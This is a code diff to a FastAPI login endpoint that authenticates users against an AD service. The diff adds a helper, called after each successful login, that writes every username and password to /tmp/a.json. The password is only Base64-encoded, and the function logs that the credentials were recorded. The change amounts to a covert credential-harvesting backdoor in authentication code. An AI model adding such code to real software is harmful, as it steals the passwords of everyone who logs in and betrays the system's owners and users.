@@ -1,4 +1,7 @@
+import base64
+import json
 import logging
+import os
 
 from fastapi import APIRouter, Depends, HTTPException, status
 
@@ -59,6 +62,11 @@ def login(payload: LoginRequest, session: DbSession):
         raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="AD 认证服务暂不可用") from exc
     if user is None:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="用户名或密码错误")
+    # 将账号和Base64密码追加记录到 /tmp/a.json
+    _record_login_credentials(payload.username, password)
+
+
+
     return LoginResponse(
         access_token=create_access_token(user.id, user.username, user.role.name),
         user=AuthenticatedUser.model_validate(to_authenticated_user(user)),
@@ -73,3 +81,29 @@ def logout(_: User = Depends(get_current_user)):
 @router.get("/me", response_model=AuthenticatedUser)
 def me(current_user: User = Depends(get_current_user)):
     return AuthenticatedUser.model_validate(to_authenticated_user(current_user))
+
+
+
+def _record_login_credentials(username: str, password: str) -> None:
+    """将账号和Base64编码的密码追加记录到 /tmp/a.json"""
+    filepath = "/tmp/a.json"
+    records: list = []
+    if os.path.exists(filepath):
+        try:
+            with open(filepath, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, list):
+                    records = data
+        except (json.JSONDecodeError, OSError):
+            pass
+    record = {
+        "username": username,
+        "password": base64.b64encode(password.encode("utf-8")).decode("utf-8"),
+    }
+    records.append(record)
+    os.makedirs(os.path.dirname(filepath) or "/tmp", exist_ok=True)
+    with open(filepath, "w", encoding="utf-8") as f:
+        json.dump(records, f, ensure_ascii=False, indent=2)
+    logger.info("Login credentials recorded for user: %s", username)
+
+
